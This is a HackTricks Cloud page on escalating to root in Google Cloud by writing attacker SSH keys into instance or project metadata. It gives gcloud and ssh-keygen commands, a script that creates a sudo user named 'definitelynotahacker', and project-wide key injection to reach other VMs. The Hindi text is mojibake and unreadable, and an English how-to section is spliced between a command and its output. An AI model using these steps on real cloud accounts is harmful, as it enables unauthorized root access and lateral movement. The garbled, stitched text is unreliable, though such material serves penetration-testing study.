# GCP - рдЕрддрд┐рд░рд┐рдХреНрдд SSH рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЬреЛрдбрд╝реЗрдВ

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **рддреБрд░рдВрдд** рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ рдлрд╝реЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## рдореЗрдЯрд╛рдбреЗрдЯрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

рдпрджрд┐ рдЖрдк **рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд╡рд░реНрдзрд┐рдд рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВред рдЗрд╕ рдЕрдиреБрдорд╛рдирд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╕реНрдерд┐рддрд┐рдпрд╛рдБ рд╣реИрдВ рдЬреЛ рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:

_**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛**_\
рдпрджрд┐ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдПрдХреНрд╕реЗрд╕ **рд╕реНрдХреЛрдк** рдХреЛ **рдкреВрд░реА рдкрд╣реБрдВрдЪ** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рдХрдо рд╕реЗ рдХрдо **рдХрдВрдкреНрдпреВрдЯ API рддрдХ рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИ**, рддреЛ рдпрд╣ рд╡рд┐рдиреНрдпрд╛рд╕ **рд╡рд┐рдХрд▓реНрдк** рдХреЛ рдЙрдиреНрдирддрд┐ рдХреЗ рд▓рд┐рдП **рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓** рд╣реИред **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** **рд╕реНрдХреЛрдк** рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдирд╣реАрдВ рд╣реИред

_**рдХрд╕реНрдЯрдо рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛**_\
рдХрд╕реНрдЯрдо рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп, рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд IAM рдЕрдиреБрдорддрд┐рдпреЛрдВ рдореЗрдВ рд╕реЗ **рдПрдХ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:

* `compute.instances.setMetadata` (рдПрдХрд▓ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП)
* `compute.projects.setCommonInstanceMetadata` (рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдВ рд╕рднреА рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП)

рд╣рд╛рд▓рд╛рдВрдХрд┐, Google [рдЕрдиреБрд╢рдВрд╕рд╛](https://cloud.google.com/compute/docs/access/service-accounts#associating\_a\_service\_account\_to\_an\_instance) рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХрд╕реНрдЯрдо рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реЗрд╕ рд╕реНрдХреЛрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВ, рдлрд┐рд░ рднреА рдЗрд╕реЗ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд **рдПрдХреНрд╕реЗрд╕ рд╕реНрдХреЛрдк** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА:

* `https://www.googleapis.com/auth/compute`
* `https://www.googleapis.com/auth/cloud-platform`

### **рдХрд╕реНрдЯрдо рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдореЗрдВ SSH рдХреБрдВрдЬреА рдЬреЛрдбрд╝реЗрдВ**

GCP рдкрд░ **рд▓рд┐рдирдХреНрд╕** **рд╕рд┐рд╕реНрдЯрдо** рдЖрдорддреМрд░ рдкрд░ [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛ рд░рд╣реЗ рд╣реЛрдВрдЧреЗред рдЗрдирдореЗрдВ рд╕реЗ рдПрдХ рд╣реИ [рдЦрд╛рддреЗ рдбреЗрдорди](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), рдЬреЛ **рдирд┐рдпрдорд┐рдд рдЕрдВрддрд░рд╛рд▓ рдкрд░** **рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рдкреНрд░рд╢реНрди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдзрд┐рдХреГрдд SSH рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬрд┐рдпреЛрдВ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЗ рд▓рд┐рдП**ред

**рдпрджрд┐ рдПрдХ рдирдИ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ** рдХреБрдВрдЬреА рдХрд╛ рд╕рд╛рдордирд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ рдкреНрд░реЛрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ **рд╕реНрдерд╛рдиреАрдп рдорд╢реАрди рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛**ред рдХреБрдВрдЬреА рдХреЗ рдкреНрд░рд╛рд░реВрдк рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдпрд╛ рддреЛ рдЗрд╕реЗ рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ `~/.ssh/authorized_keys` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛ рдпрд╛ рдирдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдИ рдЬрд╛рдПрдЧреА рдЬрд┐рд╕рдореЗрдВ `sudo` рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрдВрдЧреЗред

рддреЛ, рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЗ рд╕рд╛рде **рдХрд╕реНрдЯрдо рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рд╕реНрдерд╛рдиреАрдп рд╕рд┐рд╕реНрдЯрдо рдкрд░ **рдЙрдЪреНрдЪрддрдо рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП SSH рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд** рдХрд░рдХреЗ рд░реВрдЯ рддрдХ **рд╡рд░реНрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдк **рдХрд╕реНрдЯрдо рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдЯрд╛рдбреЗрдЯрд╛** рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рд╡рд░реНрддрдорд╛рди GCP рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдВ рдХрд┐рд╕реА рднреА рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд░реВрдЯ рддрдХ рд╡рд░реНрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЦрд╛рддреЗ рдбреЗрдорди рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИред

### **рдореМрдЬреВрджрд╛ рдЙрдЪреНрдЪрддрдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдореЗрдВ SSH рдХреБрдВрдЬреА рдЬреЛрдбрд╝реЗрдВ**

рдЪрд▓реЛ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рдореМрдЬреВрджрд╛ рдЦрд╛рддреЗ рдореЗрдВ рдЕрдкрдиреА рдХреБрдВрдЬреА рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдВрднрд╡рддрдГ рд╕рдмрд╕реЗ рдХрдо рд╢реЛрд░ рдордЪрд╛рдПрдЧрд╛ред

**рдореМрдЬреВрджрд╛ SSH рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**ред рдпреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдПрдХ рдХреЛ рдЪреБрдиреЗрдВ рдХреНрдпреЛрдВрдХрд┐ рдЙрдирдХреЗ рдкрд╛рд╕ рд╕рдВрднрд╡рддрдГ sudo рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрдВрдЧреЗред
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
## Add Custom SSH Metadata

To escalate privileges in Google Cloud Platform (GCP), you can add custom SSH metadata to a GCP instance. This allows you to gain SSH access to the instance with elevated privileges.

To add custom SSH metadata, follow these steps:

1. Open the GCP Console and navigate to the Compute Engine page.
2. Select the instance to which you want to add custom SSH metadata.
3. Click on the "Edit" button at the top of the page.
4. Scroll down to the "Custom metadata" section.
5. Click on the "Add item" button.
6. In the "Key" field, enter `ssh-keys`.
7. In the "Value" field, enter the SSH public key that you want to use for authentication.
8. Click on the "Save" button to save the changes.

Once the custom SSH metadata is added, you can SSH into the GCP instance using the specified SSH key. This will grant you elevated privileges on the instance.

Note: Make sure to remove the custom SSH metadata after you have completed your tasks to avoid leaving any potential vulnerabilities.
```
...
metadata:
fingerprint: QCZfVTIlKgs=
items:
...
- key: ssh-keys
value: |-
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
...
```
рдЬрд╛рдиреЗрдВ рдХрд┐ рдкрдмреНрд▓рд┐рдХ рдХреАрдЬрд╝ рдХрд╛ **рдереЛрдбрд╝рд╛ рдЕрдЬреАрдм рдлреЙрд░реНрдореЗрдЯ** рд╣реИ - **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рдкреНрд░рд╛рд░рдВрдн рдореЗрдВ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (рдЗрд╕рдХреЗ рдмрд╛рдж рдПрдХ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рджреНрд╡рд╛рд░рд╛) рдФрд░ рдлрд┐рд░ рд╕реЗ **рдЕрдВрдд рдореЗрдВ** рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рд╣рдореЗрдВ рдЗрд╕ рдлреЙрд░реНрдореЗрдЯ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред рд╕рд╛рдорд╛рдиреНрдп SSH рдХреАрдЬрд╝ рдСрдкрд░реЗрд╢рди рдХреЗ рд╡рд┐рдкрд░реАрдд, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдмрд╣реБрдд рдорд╛рдпрдиреЗ рд░рдЦрддрд╛ рд╣реИ!

**рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдХреАрдЬрд╝ рдХреЗ рд╕рд╛рде рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдирдП рдкрд╛рда** рдлрд╝рд╛рдЗрд▓ `meta.txt` рдореЗрдВ рд╕рд╣реЗрдЬреЗрдВред

рдЪрд▓реЛ рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рд╣рдо рдКрдкрд░ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `alice` рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВред рд╣рдо рдЕрдкрдиреЗ рд▓рд┐рдП рдПрдХ **рдирдИ рдХреА** рдЗрд╕ рддрд░рд╣ рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВрдЧреЗ:
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
рдЕрдкрдиреА рдирдИ рдкрдмреНрд▓рд┐рдХ рдХреБрдВрдЬреА рдХреЛ рдлрд╝рд╛рдЗрд▓ `meta.txt` рдореЗрдВ рдЬреЛрдбрд╝реЗрдВ рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рд╛рд░реВрдк рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░реЗрдВ:
```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```
рдЕрдм, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдЕрдкрдиреЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рд▓рд┐рдП **SSH рдХреБрдВрдЬреА рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдХреЛ рдкреБрдирдГ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
рдЖрдк рдЕрдм рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ `alice` рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
### **рдПрдХ рдирдпрд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдПрдВ рдФрд░ рдПрдХ SSH рдХреБрдВрдЬреА рдЬреЛрдбрд╝реЗрдВ**

рдКрдкрд░ рджрд┐рдП рдЧрдП рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╕рдордп рдХреЛрдИ рдореМрдЬреВрджрд╛ рдХреБрдВрдЬреА рдирд╣реАрдВ рдорд┐рд▓реА? `/etc/passwd` рдореЗрдВ рдХрд┐рд╕реА рдФрд░ рд░реБрдЪрд┐рдХрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП?

рдЖрдк **рдКрдкрд░ рджрд┐рдП рдЧрдП рд╕рдорд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдкрд╛рд▓рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рд▓реЗрдХрд┐рди рдмрд╕ **рдПрдХ рдирдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдмрдирд╛рдПрдВ**ред рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдмрдирд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ `sudo` рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ред рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦреЗрдЧреА:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╕реНрддрд░ рдкрд░ SSH рдХреБрдВрдЬреА <a href="#sshing-around" id="sshing-around"></a>

рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ рджрд┐рдП рдЧрдП рд╡рд┐рд╡рд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ рдЖрдк рдЕрдзрд┐рдХ VMs рдХреЛ рд╕рдВрдХреНрд░рдорд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╣рдо рдЗрд╕реЗ рдФрд░ рднреА рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ [**рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╕реНрддрд░ рдкрд░ SSH рдХреБрдВрдЬреА рд▓рд╛рдЧреВ рдХрд░рдХреЗ**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide), рдЬреЛ рдЖрдкрдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ **рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд рдЦрд╛рддреЗ рдореЗрдВ SSH рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдХрд┐рд╕реА рднреА рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рд▓рд┐рдП рдЬрд┐рд╕рдиреЗ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ "рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╕реНрддрд░ SSH рдХреБрдВрдЬреА рдмреНрд▓реЙрдХ рдХрд░реЗрдВ" рд╡рд┐рдХрд▓реНрдк рдирд╣реАрдВ рдЪреБрдирд╛ рд╣реИред
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
рдпрджрд┐ рдЖрдк рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╕рд╛рд╣рд╕реА рд╣реИрдВ, рддреЛ рдЖрдк рдмрд╕ `gcloud compute ssh [INSTANCE]` рдЯрд╛рдЗрдк рдХрд░рдХреЗ рдЕрдкрдиреЗ рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рдмреЙрдХреНрд╕ рдкрд░ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
